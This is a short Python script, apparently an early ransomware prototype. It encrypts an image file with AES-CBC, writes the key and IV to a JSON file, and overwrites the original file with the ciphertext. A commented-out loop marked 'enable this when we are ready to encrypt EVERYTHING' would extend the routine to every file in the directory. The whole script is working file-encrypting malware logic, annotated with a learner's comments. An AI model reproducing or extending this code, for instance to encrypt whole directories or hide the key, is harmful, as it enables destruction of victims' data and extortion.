import os
import glob
import json
from base64 import b64encode
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend

#enable this when we are ready to encrypt EVERYTHING
#for file in glob.glob('./*')):

#reads the file as a byte 
f = open('traktor.jpg', 'rb')
#break the file name to two parts, the name and extension
fname, fext = os.path.splitext('traktor.jpg')
#store the read byte into data
data = f.read()
#always close after an open
f.close()

#===================Some variables needed
#not sure about this part
backend = default_backend()
#randomize the key, but not sure if it is suppose to be this way because we will need to reuse it for later
key = os.urandom(32)
#randomize the iv, but not sure if it suppose to be this way because we will need to reuse it for later
iv = os.urandom(16)
#initalize the padder because CBC needs a padder
padder = padding.PKCS7(128).padder()

#dictionary to put into the JSON, unfortunately we can't put byte into json
#so we have to decode them (convert them to a non-byte
topSecretStuff = {}
topSecretStuff["key"] = b64encode(key).decode('utf-8')
topSecretStuff["iv"] = b64encode(iv).decode('utf-8')
topSecretStuff["fileName"] = fname
topSecretStuff["ext"] = fext

#create a json so we can write into it
f = open('topSecretStuff.json', 'w')
#put everything from the dictionary into the json
json.dump(topSecretStuff, f)
#Close.... the json 
f.close()

#it's a method to use all the keys to cipher them the first two parameter uses the libraries to implement AES and CBC using our key and IV
cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=backend)
#enables our encrpytion
encryptor = cipher.encryptor()

#================== Core of it all
#This will pad the bytes and then finalize it, as in it will return the rest after the last block is done
ct = padder.update(data) + padder.finalize()
#after it has been padded, it will be encrypted.. remember since it's block it need to finish and return the rest
ct = encryptor.update(ct) + encryptor.finalize()

#Create the fake file
filename = fname + fext
f = open(filename, 'wb')
#write the encrypted byte into the file
f.write(ct)
f.close()
